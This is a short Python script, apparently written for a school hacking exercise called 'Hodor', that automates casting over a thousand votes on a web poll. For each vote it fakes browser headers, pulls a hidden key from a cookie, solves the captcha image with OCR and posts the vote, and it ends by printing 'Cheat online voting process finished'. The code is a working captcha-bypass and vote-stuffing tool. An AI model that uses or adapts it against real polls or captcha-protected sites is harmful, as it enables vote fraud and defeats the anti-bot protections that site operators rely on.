#!/usr/bin/python3
'''
Program to vote 1024 times
to the Hodor project from
Holberton School
'''


# Import module
import requests
try:
    from PIL import Image
except ImportError:
    import Image
import pytesseract
pytesseract.tesseract_cmd = r'C:\Users\ellen\AppData\Local\Programs\
                            Tesseract-OCR\tesseract'

# Level 3
times = 1025

URL = 'http://158.69.76.135/level3.php'
windows_user = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36")
header = {"User-Agent": windows_user, "Referer": URL}
url_captcha = 'http://158.69.76.135/captcha.php'

for i in range(times):
    try:
        with requests.Session() as session:
            # Get the response object by get method
            response = session.get(URL, headers=header)
            # get image response object
            image = session.get(url_captcha, headers=header)

            # write captcha file
            image_file = open('captcha.png', 'wb')
            image_file.write(image.content)
            image_file.close()

            # Solving captcha with pytesseract
            captcha = pytesseract.image_to_string(Image.open('captcha.png'))
            captcha = captcha.replace(" ", "").strip()
            print(captcha, type(captcha))

            # Obtaining the key from cookies
            c = response.cookies
            key = ""
            for cookie in c:
                if cookie.name == 'HoldTheDoor':
                    key = cookie.value
                    break

            # Composing the data that will be send
            my_id = {
                    'id': 2282, 'key': key,
                    'captcha': captcha, 
                    'holdthedoor': 'submit'
                    }
            # Send the data
            response_post = session.post(URL, headers=header, data=my_id)
    except Exception as error:
        print(error)
    print(response_post.headers)
    print('Status: {}'.format(response_post.status_code))
    print("Status: {} of 1024".format(i + 1))
print("Cheat online voting process finished :)")
